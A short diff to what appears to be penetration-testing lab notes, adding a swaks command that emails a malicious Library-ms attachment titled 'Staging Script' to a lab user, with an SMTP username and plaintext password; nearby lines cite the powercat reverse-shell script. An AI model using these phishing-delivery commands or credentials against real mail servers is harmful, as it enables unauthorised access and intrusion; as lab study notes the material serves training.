@@ -55,6 +55,11 @@ https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
+User + Password field included
+```
+swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.112.189 --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user "maildmz@relia.com" --auth-password "DPuBT9tGCBrTbR"
+```
+
 # 🔹Transfer files (Windows to Linux)
 ```
 # Windows TO
